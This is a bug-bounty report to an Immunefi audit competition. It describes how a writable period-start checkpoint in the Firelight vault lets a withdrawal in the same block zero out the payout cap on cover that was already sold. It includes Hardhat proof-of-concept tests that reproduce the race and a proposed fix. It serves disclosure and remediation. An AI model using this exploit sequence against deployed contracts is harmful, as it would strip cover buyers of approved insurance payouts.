# 90127 sc high the period start collateral snapshot is still writable inside the boundary block so cover is committed against one basis while the approved claim is capped by a lower one

**Submitted on Aug 23rd 2026 at 06:19:00 UTC by @tinnohofficial for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #90127
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Brief/Intro

`CoverOrderAllocator` sizes a period's cover capacity from `vault.totalAssetsAt(vault.currentPeriodStart())`. `FirelightVault.payout` caps every incident payment for that period from the same checkpoint key. The key looks immutable because it names the period start. It is not. Every vault write uses `block.timestamp` as the checkpoint key, and `Checkpoints.push` overwrites the stored value when the incoming key equals the latest key, so in the single block whose timestamp equals the period start, capacity can be committed against one value and the payout cap then moved to a lower one.

End to end, through the real allocator, cover NFT and `IncidentManager`: $200,000 of cover is committed, settled, paid for and receipted, then a fully approved $200,000 claim pays **0 fXRP**, and the LP whose capital backed that cover claims the entire 100,000 fXRP two periods later.

## Vulnerability Details

### The period-start basis is writable inside the boundary block

`totalAssetsAt` resolves the last checkpoint at or before a timestamp (`FirelightVault.sol:456-458`):

```solidity
function totalAssetsAt(uint48 timestamp) public view returns (uint256) {
    return _traceTotalAssets.upperLookupRecent(timestamp);
}
```

Every accounting write keys that trace by the current block timestamp (`FirelightVault.sol:1044-1055`):

```solidity
uint48 ts = Time.timestamp();
...
if (isLogAssets) _traceTotalAssets.push(ts, _totalAssets);
```

and an equal-key push replaces the stored value instead of appending (`Checkpoints.sol:198-215`):

```solidity
if (exists && key == lastKey) {
    self._values[len - 1] = value;
} else {
    self._trace.push(key, uint208(len));
    self._values.push(value);
}
```

The last `_traceTotalAssets` write in the block whose timestamp equals `periodStart` therefore becomes the permanent value of `totalAssetsAt(periodStart)`. Writes later in the period carry strictly greater keys and cannot restore it.

`withdraw`, `redeem` and `payout` deflate that value; `deposit` and `mint` inflate it, which is harmless because `paidAmount` stays bounded by the assessed loss; `checkpointTotalAssets` can do either.

### Two consumers read that same mutable key

Capacity (`CoverOrderAllocator.sol:710-716`):

```solidity
uint256 totalAssetsCanonical = Decimals.convert(
    $.vault.totalAssetsAt($.vault.currentPeriodStart()),
    $.vaultAssetDecimals,
    CANONICAL_DECIMALS,
    Math.Rounding.Floor
);
```

Payout cap (`FirelightVault.sol:911` and `:927`):

```solidity
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
...
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

Neither consumer freezes the value it used. The design requires both to resolve from the same period basis, and inside the boundary block they do not.

### The withdrawn capital is still designated payable

This is what makes the result incoherent rather than merely conservative. `_requestWithdraw` assigns the request to `currentPeriod() + 1` (`FirelightVault.sol:1008`), and at the boundary block `currentPeriod()` has already advanced to `P`, so the request lands in bucket `P+1`. `payout` deliberately includes that bucket (`FirelightVault.sol:916-926`), with the comment stating the intent at `:920`: "otherwise exposed assets could escape by withdrawing first".

The assets are in the contract, are inside `activePayableAmount`, and are meant to be slashable for a period `P` incident. Only the corrupted `assetsAtCapturePeriod` leg of the `min` blocks them.

### Reaching the state

`commitAllocation` is restricted to the current period (`CoverOrderAllocator.sol:343`), so it cannot execute before `periodStart`, and the boundary block is the first block it can occupy. It is also the natural block to occupy, because cover only earns premium for the part of the period it is live for.

The divergence needs one ordering: commit first, deflating write second, same block. An LP submits `withdraw` behind the public `commitAllocation` transaction at the same gas price. If the withdrawal lands first, both consumers read the same reduced value and there is no bug, so the ordering is a genuine precondition and is stated as one.

The proof of concept does not use a bundler contract or any helper. The allocator role and the LP send two independently signed transactions from two different accounts, automining is disabled, both are mined in one block, and the test asserts their shared block number, their relative index, and that the block timestamp equals the period start exactly.

## Impact Details

### Demonstrated result

100,000 fXRP of vault capital at $2, an empty first-loss buffer, $200,000 of committed and settled cover, and a fully approved $200,000 assessment:

```
after race: totalAssetsAt(period1Start) = 0
committed capacity (USD canonical) = 200000000000000000000000
approved loss $200k -> vault paid: 0 fXRP
user1 claimed the FULL 100k fXRP bucket
```

Premium was collected and the cover NFT was minted, the loss was approved in full, and the vault paid nothing while the collateral walked out intact. That is protocol insolvency for the sold cover.

### The bound, stated before the damage

`assetsAtCapturePeriod` is a **per-call** limit, not a cumulative one. The vault says so at `FirelightVault.sol:885-886`: "The vault applies only these per-call limits". Where the corrupted checkpoint is non-zero, a second `payout` call reaches the remainder, so the collateral is not lost at the vault level and I do not claim it is.

What the defect costs where the checkpoint is non-zero:

* the approved assessment still closes short, because `IncidentManager.approveCurrentAssessment` calls `vault.payout` exactly once and then sets `IncidentStatus.CLOSED` (`:423-434`), and a closed incident cannot be re-assessed;
* recovery requires reporting additional incidents for the same event inside the payout window, one per cap-sized slice. The count is `ceil(payable / cap)`, measured at **11** for an LP holding 90 percent of the pool.

Where the boundary write drives the checkpoint to zero, the `min` collapses and no number of calls or incidents recovers anything. That is the demonstrated case. It requires the withdrawing LP to hold all active capital, which is an ordinary condition for a newly launched or single anchor LP vault, and the shortfall degrades smoothly with concentration rather than disappearing.

### Who loses, and permanence

The loss lands on the cover buyer. A single payout call slashes the withdrawing LP pro rata on what is actually paid, so the LP is not advantaged relative to the others; all LPs collectively retain what the buyer was owed.

The corrupted checkpoint itself cannot be repaired. `Checkpoints.push` only overwrites on an equal key, so once the block timestamp has passed, no transaction can restore `totalAssetsAt(periodStart)`. Every payout call for every incident captured in that period is capped by the corrupted value for the whole window, and no admin function rewrites a historical checkpoint.

### Novelty

Both consumers of this key are Phase-2 code. The legacy vault has no `payout` function at all, and OpenZeppelin's July 2025 scope was limited to `Checkpoints.sol`, `FirelightVault.sol` and `FirelightVaultStorage.sol`, so `CoverOrderAllocator` has never been professionally reviewed.

## Recommended Fix

Give the period an immutable collateral basis and have both consumers read it. Persist it once:

```solidity
// written by the first transaction of a period, read by both consumers
periodStartAssets[period]
```

Or, if the intended definition is the state entering the period, query the last value strictly before the boundary in both places:

```solidity
// FirelightVault.payout
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart - 1);

// CoverOrderAllocator._computeAvailableCapacity
$.vault.totalAssetsAt($.vault.currentPeriodStart() - 1),
```

Every write inside the boundary block then carries a strictly greater key. Both consumers must adopt the same definition. Reassigning a boundary-block withdrawal to bucket `P` instead of `P+1` is not sufficient on its own, because `payout` and `checkpointTotalAssets` produce the same divergence without any withdrawal.

## References

* `contracts/core/FirelightVault.sol:456-458` - `totalAssetsAt` is an `upperLookupRecent`
* `contracts/core/FirelightVault.sol:1044-1055` - `_logTrace` keys the trace by `Time.timestamp()`
* `contracts/core/FirelightVault.sol:952` - `payout` writes the same trace at `Time.timestamp()`
* `contracts/core/FirelightVault.sol:523-527` - `checkpointTotalAssets` writes the same trace
* `contracts/core/lib/Checkpoints.sol:198-215` - equal-key push replaces the stored value
* `contracts/core/CoverOrderAllocator.sol:710-716` - capacity reads `totalAssetsAt(currentPeriodStart())`
* `contracts/core/CoverOrderAllocator.sol:343` - commits are restricted to the current period
* `contracts/core/FirelightVault.sol:911`, `:927` - payout cap reads the same key and applies it
* `contracts/core/FirelightVault.sol:916-926` - bucket `capturePeriod + 1` is inside `activePayableAmount`
* `contracts/core/FirelightVault.sol:920` - "otherwise exposed assets could escape by withdrawing first"
* `contracts/core/FirelightVault.sol:1008` - `_requestWithdraw` assigns bucket `currentPeriod() + 1`
* `contracts/core/FirelightVault.sol:885-886` - the cap is documented as a per-call limit
* `contracts/core/IncidentManager.sol:423-434` - one `vault.payout` per approved assessment, then `IncidentStatus.CLOSED`

## Proof of Concept

## Proof of Concept

### Step-by-step

1. Deploy the real vault, `CoverOrderAllocator`, `CoverNFT` and `IncidentManager`. One LP deposits 100,000 fXRP during period 0. The price feed reports $2, and the first-loss buffer wallet is empty so the whole loss falls on the vault.
2. The curator creates a period 1 cover order for $200,000 and the buyer approves the premium.
3. Set the next block timestamp to exactly `periodConfigurations(0).epoch + 86400`, the start of period 1, and disable automining.
4. The allocator role sends `commitAllocation` for period 1 against a capacity of $200,000. It validates against `totalAssetsAt(period1Start)`, which is still 100,000 fXRP.
5. The LP sends `withdraw(100_000e6)` from a different account at the same gas price. It is mined in the same block, after the commit.
6. Mine the block and assert: both receipts share a block number, the commit index is lower than the withdrawal index, and the block timestamp equals the period start. `totalAssetsAt(period1Start)` is now `0`.
7. Settle the Merkle allocation. The premium is pulled and the cover NFT is minted to the buyer.
8. Report, confirm, assess and approve a full $200,000 incident for period 1. `vaultPaidAmount` is `0`.
9. Advance through the withdrawal delay. The LP claims the full 100,000 fXRP bucket.

The bound is established separately: with a non-zero corrupted checkpoint a second `payout` call reaches the remainder, the number of calls needed scales with LP concentration, and at a zero checkpoint nothing recovers.

### Run

Save the two files under `### PoC Code` as `test/glm_L06_strong_race.js` and `test/verify_l06_recovery.js`, then run:

```bash
npx hardhat test test/glm_L06_strong_race.js
npx hardhat test test/verify_l06_recovery.js
```

Neither file requires any additional contract or repository change.

### Observed Output

Tested against `v1_audit_ready` (`42f9ea5`):

```
  L-06 strong form: commit-before-withdraw in the boundary block
after race: totalAssetsAt(period1Start) = 0 | committed capacity (USD canonical) = 200000000000000000000000
approved loss $200k -> vault paid: 0 fXRP (expected without race: 100000000000)
user1 claimed the FULL 100k fXRP bucket — capital that backed the sold cover escaped the payout
    ✔ committed capacity uses pre-withdrawal snapshot; payout cap is post-withdrawal

  1 passing
```

```
  VERIFY-L06: bound of the boundary-block cap corruption
cap = 600000; single call pays 600000; two calls pay 1000000
vault token balance after = 0 -> nothing is stranded
    ✔ A: the deflated cap is per-call — two calls recover the whole shortfall
whale withdrew 90% at the boundary: cap = 100000 (10% of the pool)
full 1,000,000 payout needed 11 payout calls -> 11 separate incidents
    ✔ B: recovery cost scales with LP concentration, not with pool size
whole pool withdrawn at the boundary: cap = 0
payout paid 0 across 1 call(s) -> no number of calls recovers anything
the withdrawing LP still claims 1000000 in full
    ✔ C: the shortfall IS absolute once the snapshot reaches zero

  3 passing
```

### PoC Code

`test/glm_L06_strong_race.js`:

```javascript
// Strong-form L-06 race: commitAllocation BEFORE withdrawal in the same boundary block.
// Demonstrates: committed capacity uses the pre-withdrawal period-start snapshot, then the
// same-block withdrawal overwrites totalAssetsAt(periodStart) to a lower value, so a fully
// valid approved claim is capped by the LOWER value -> vault pays zero/shortfall while the
// withdrawing user escapes untouched.
const { upgrades, ethers, network } = require("hardhat");
const { time } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { StandardMerkleTree } = require("@openzeppelin/merkle-tree");

const DAY = 86400n;

async function randSigner() {
  const w = ethers.Wallet.createRandom().connect(ethers.provider);
  await ethers.provider.send("hardhat_setBalance", [w.address, "0x3635C9ADC5DEA00000"]);
  return w;
}

describe("L-06 strong form: commit-before-withdraw in the boundary block", function () {
  it("committed capacity uses pre-withdrawal snapshot; payout cap is post-withdrawal", async function () {
    const [deployer, user1] = await ethers.getSigners();
    const admin = await randSigner();
    const curator = await randSigner();
    const allocatorRole = await randSigner();
    const configAdmin = await randSigner();
    const adminRole = await randSigner();
    const premiumCollector = await randSigner();
    const flbWallet = await randSigner(); // EMPTY wallet -> whole loss hits the vault
    const buyer = await randSigner();
    const approver = await randSigner();
    const rejecter = await randSigner();
    const invalidator = await randSigner();
    const imCurator = await randSigner();
    const imConfigAdmin = await randSigner();
    const payoutAdmin = await randSigner();
    const priceFeedAdmin = await randSigner();
    const payoutReceiver = await randSigner();

    const ERC20 = await ethers.getContractFactory("MockERC20");
    const usdc = await ERC20.deploy("FLB USD", "fUSD", 6);
    const asset = await ERC20.deploy("fXRP", "fXRP", 6);

    const Agg = await ethers.getContractFactory("MockAggregatorV3");
    const priceFeed = await Agg.deploy(18, 2n * 10n ** 18n); // XRP = $2

    const abi = ethers.AbiCoder.defaultAbiCoder();
    const VaultF = await ethers.getContractFactory("FirelightVault");
    const initParams = abi.encode(
      ["address", "address", "address", "address", "address", "address", "uint256", "uint48"],
      [deployer.address, deployer.address, deployer.address, deployer.address, deployer.address, deployer.address, 10n ** 18n, DAY]
    );
    const vault = await upgrades.deployProxy(VaultF, [await asset.getAddress(), "stXRP", "stXRP", initParams], { kind: "transparent" });

    // user1 deposits 100k fXRP during period 0
    await asset.mint(user1.address, 1_000_000n * 10n ** 6n);
    await asset.connect(user1).approve(await vault.getAddress(), ethers.MaxUint256);
    await vault.connect(user1).deposit(100_000n * 10n ** 6n, user1.address);

    const NFTF = await ethers.getContractFactory("CoverNFT");
    const nft = await upgrades.deployProxy(NFTF, ["Cover", "COV", "", admin.address, deployer.address, ethers.ZeroAddress, ethers.ZeroAddress], { kind: "transparent" });

    const marketId = ethers.keccak256(abi.encode(["uint64", "string", "bytes32"], [1, "Morpho", ethers.encodeBytes32String("m1")]));
    const coverAmt = 200_000n * 10n ** 18n; // $200k = 100k fXRP * $2 — exactly the committed basis

    const AllocF = await ethers.getContractFactory("CoverOrderAllocator");
    const allocInit = {
      vault: await vault.getAddress(),
      premiumCollector: premiumCollector.address,
      coverNFT: await nft.getAddress(),
      priceFeedAdapter: await priceFeed.getAddress(),
      maxPriceAge: 7 * 24 * 3600,
      premiumTokens: [await usdc.getAddress()],
      admin: admin.address, adminRole: adminRole.address, curatorRole: curator.address,
      allocatorRole: allocatorRole.address, configAdminRole: configAdmin.address,
      initialProtocolConcentrations: [{ protocol: "Morpho", chainId: 1, maxProtocolConcentrationBps: 10000 }],
      newMarkets: [{ chainId: 1, protocol: "Morpho", market: ethers.encodeBytes32String("m1") }],
      capacityConfig: {
        minCAR: 12000, firstLossBufferToken: await usdc.getAddress(), firstLossBuffer: flbWallet.address,
        effectiveLeverage: 12000, minOrderMarketCoverAmount: 1, divergenceToleranceBps: 0,
      },
    };
    const alloc = await upgrades.deployProxy(AllocF, [allocInit], { kind: "transparent" });
    await nft.connect(admin).grantRole(await nft.MINTER_ROLE(), await alloc.getAddress());

    // order for period 1 (created during period 0)
    await alloc.connect(curator).createCoverOrder(
      buyer.address, buyer.address, "ben-1", await usdc.getAddress(),
      [{ marketId, coverRateAnnual: 1000, coverAmount: coverAmt }], 0
    );
    const prem = (coverAmt * 1000n * DAY + 10000n * 365n * DAY - 1n) / (10000n * 365n * DAY);
    await usdc.mint(buyer.address, prem);
    await usdc.connect(buyer).approve(await alloc.getAddress(), prem);

    const tree = StandardMerkleTree.of([[0n, [[marketId, coverAmt]]]], ["uint256", "(bytes32,uint256)[]"]);

    // ============ THE RACE: two independently signed txs in the boundary block ============
    // commitAllocation reads totalAssetsAt(periodStart) == 100k fXRP. The LP's later tx in
    // that same block overwrites the period-start checkpoint with the post-withdrawal value.
    await priceFeed.setAnswer(2n * 10n ** 18n); // refresh price BEFORE the boundary block
    const pc0 = await vault.periodConfigurations(0n);
    const boundary = pc0.epoch + DAY;
    const capacity = 100_000n * 10n ** 6n * 10n ** 12n * 2n; // 100k fXRP * $2 in canonical
    const gas = { gasLimit: 2_000_000n, gasPrice: 2_000_000_000n };
    let commitTx;
    let withdrawTx;
    await network.provider.send("evm_setAutomine", [false]);
    try {
      await network.provider.send("evm_setNextBlockTimestamp", [Number(boundary)]);

      // Distinct signers and distinct transactions. Equal gas prices preserve FIFO arrival
      // order in Hardhat's mempool, matching an allocator tx followed by the LP's tx.
      commitTx = await alloc.connect(allocatorRole).commitAllocation(
        1n, tree.root, coverAmt, capacity, gas
      );
      withdrawTx = await vault.connect(user1).withdraw(
        100_000n * 10n ** 6n, user1.address, user1.address, gas
      );

      await network.provider.send("evm_mine");
    } finally {
      await network.provider.send("evm_setAutomine", [true]);
    }

    const commitReceipt = await commitTx.wait();
    const withdrawReceipt = await withdrawTx.wait();
    expect(commitReceipt.blockNumber).to.equal(withdrawReceipt.blockNumber);
    expect(commitReceipt.index).to.be.lessThan(withdrawReceipt.index);
    const boundaryBlock = await ethers.provider.getBlock(commitReceipt.blockNumber);
    expect(BigInt(boundaryBlock.timestamp)).to.equal(boundary);

    // period-start snapshot has now been overwritten DOWNWARD by the same-block withdrawal
    expect(await vault.totalAssetsAt(boundary)).to.equal(0n);
    console.log("after race: totalAssetsAt(period1Start) =", (await vault.totalAssetsAt(boundary)).toString(),
                "| committed capacity (USD canonical) =", capacity.toString());

    // settle the order in period 1 (grace 0)
    await priceFeed.setAnswer(2n * 10n ** 18n);
    await alloc.connect(allocatorRole).settleCoverOrder(0n, [[marketId, coverAmt]], tree.getProof(0));
    expect(await nft.ownerOf(0n)).to.equal(buyer.address);

    // IncidentManager approves a FULL $200k claim for period 1
    const IMF = await ethers.getContractFactory("IncidentManager");
    const im = await upgrades.deployProxy(IMF, [
      admin.address, imCurator.address, approver.address, rejecter.address, invalidator.address,
      imConfigAdmin.address, payoutAdmin.address, priceFeedAdmin.address,
      payoutReceiver.address, await alloc.getAddress(), await priceFeed.getAddress(), 7 * 24 * 3600,
    ], { kind: "transparent" });
    await vault.grantRole(await vault.PAYOUT_ROLE(), await im.getAddress());
    await vault.grantRole(await vault.INCIDENT_ROLE(), await im.getAddress());
    await vault.grantRole(await vault.PAYOUT_ALLOWLIST_ROLE(), deployer.address);
    await vault.connect(deployer).addToPayoutAllowlist(payoutReceiver.address);

    const ts = BigInt(await time.latest());
    await im.connect(imCurator).createIncident(ts, "Major loss", ethers.id("ref-1"));
    await im.connect(imCurator).confirmIncident(1, "uri://r");
    await im.connect(imCurator).addAssessmentLosses(1, [{ coverTokenId: 0n, marketId, amount: coverAmt }]);
    await im.connect(imCurator).submitCurrentAssessment(1);
    await im.connect(approver).approveCurrentAssessment(1);

    const inc = await im.getIncident(1);
    console.log("approved loss $200k -> vault paid:", inc.incident.vaultPaidAmount.toString(), "fXRP (expected without race: 100000000000)");
    expect(inc.incident.vaultPaidAmount).to.equal(0n); // FULL shortfall on a valid claim

    // user1 escapes untouched: claim their full bucket at period 3
    await time.increaseTo(Number(boundary + 2n * DAY) + 60);
    const before = await asset.balanceOf(user1.address);
    await vault.connect(user1).claimWithdraw(2n);
    expect(await asset.balanceOf(user1.address)).to.equal(before + 100_000n * 10n ** 6n);
    console.log("user1 claimed the FULL 100k fXRP bucket — capital that backed the sold cover escaped the payout");
  });
});
```

`test/verify_l06_recovery.js`:

```javascript
const { loadFixture, time } = require('@nomicfoundation/hardhat-network-helpers')
const { deployVault } = require('./setup/fixtures.js')
const { expect } = require('chai')

// Establishes the BOUND on the boundary-block cap corruption: `assetsAtCapturePeriod` is a
// per-call limit, not a cumulative one (FirelightVault.sol:885-886 states this). Repeated payout
// calls for the same capture period therefore drain the full payable set, so permanence is
// claimed only for the case where it actually holds.
describe('VERIFY-L06: bound of the boundary-block cap corruption', function () {
  const setup = async () => {
    const ctx = await loadFixture(deployVault.bind(null, { decimals: 6, initial_deposit_limit: 10n ** 18n }))
    for (const u of ctx.users) await ctx.utils.mintAndApprove(10n ** 14n, u)
    return ctx
  }

  // Drives payout for `capture` until it stops paying; returns [totalPaid, callCount].
  const drain = async (v, signer, receiver, token, capture, request) => {
    let total = 0n, calls = 0
    for (let i = 0; i < 64; i++) {
      const before = await token.balanceOf(receiver.address)
      await v.connect(signer).payout(receiver.address, request, Number(capture))
      const got = (await token.balanceOf(receiver.address)) - before
      calls++
      total += got
      if (got === 0n) break
    }
    return [total, calls]
  }

  it('A: the deflated cap is per-call — two calls recover the whole shortfall', async () => {
    const { firelight_vault: v, payout_signer, payout_receiver, users, config, token_contract } = await setup()
    const [alice, bob, carol] = users
    await v.connect(alice).deposit(400_000n, alice.address)
    await v.connect(bob).deposit(300_000n, bob.address)
    await v.connect(carol).deposit(300_000n, carol.address)

    const dur = BigInt(config.period_configuration_duration)
    const pStart = (await v.currentPeriodStart()) + dur
    await time.setNextBlockTimestamp(pStart)
    await v.connect(alice).withdraw(400_000n, alice.address, alice.address)
    expect(await v.totalAssetsAt(pStart)).to.equal(600_000n)

    const before = await token_contract.balanceOf(payout_receiver.address)
    await v.connect(payout_signer).payout(payout_receiver.address, 1_000_000n, Number(pStart))
    const first = (await token_contract.balanceOf(payout_receiver.address)) - before
    await v.connect(payout_signer).payout(payout_receiver.address, 1_000_000n, Number(pStart))
    const total = (await token_contract.balanceOf(payout_receiver.address)) - before

    console.log(`cap = ${await v.totalAssetsAt(pStart)}; single call pays ${first}; two calls pay ${total}`)
    console.log(`vault token balance after = ${await token_contract.balanceOf(v.target)} -> nothing is stranded`)
    expect(first).to.equal(600_000n)          // the shortfall a single approved incident sees
    expect(total).to.equal(1_000_000n)        // ... and it is NOT permanent at the vault level
    expect(await token_contract.balanceOf(v.target)).to.equal(0n)
  })

  it('B: recovery cost scales with LP concentration, not with pool size', async () => {
    const { firelight_vault: v, payout_signer, payout_receiver, users, config, token_contract } = await setup()
    const [whale, rest] = users
    await v.connect(whale).deposit(900_000n, whale.address)
    await v.connect(rest).deposit(100_000n, rest.address)

    const dur = BigInt(config.period_configuration_duration)
    const pStart = (await v.currentPeriodStart()) + dur
    await time.setNextBlockTimestamp(pStart)
    await v.connect(whale).withdraw(900_000n, whale.address, whale.address)

    const cap = await v.totalAssetsAt(pStart)
    const [total, calls] = await drain(v, payout_signer, payout_receiver, token_contract, pStart, 1_000_000n)
    console.log(`whale withdrew 90% at the boundary: cap = ${cap} (10% of the pool)`)
    console.log(`full 1,000,000 payout needed ${calls} payout calls -> ${calls} separate incidents`)
    expect(cap).to.equal(100_000n)
    expect(total).to.equal(1_000_000n)
    expect(calls).to.be.gt(2)
  })

  it('C: the shortfall IS absolute once the snapshot reaches zero', async () => {
    const { firelight_vault: v, payout_signer, payout_receiver, users, config, token_contract } = await setup()
    const solo = users[0]
    await v.connect(solo).deposit(1_000_000n, solo.address)

    const dur = BigInt(config.period_configuration_duration)
    const pStart = (await v.currentPeriodStart()) + dur
    await time.setNextBlockTimestamp(pStart)
    await v.connect(solo).withdraw(1_000_000n, solo.address, solo.address)
    const bucket = (await v.currentPeriod()) + 1n

    expect(await v.totalAssetsAt(pStart)).to.equal(0n)
    const [total, calls] = await drain(v, payout_signer, payout_receiver, token_contract, pStart, 1_000_000n)
    console.log(`whole pool withdrawn at the boundary: cap = 0`)
    console.log(`payout paid ${total} across ${calls} call(s) -> no number of calls recovers anything`)
    expect(total).to.equal(0n)

    // the capital walks out untouched two periods later
    await time.increase(config.period_configuration_duration * 2)
    const claimed = await v.connect(solo).claimWithdraw.staticCall(bucket)
    console.log(`the withdrawing LP still claims ${claimed} in full`)
    expect(claimed).to.equal(1_000_000n)
  })
})
```
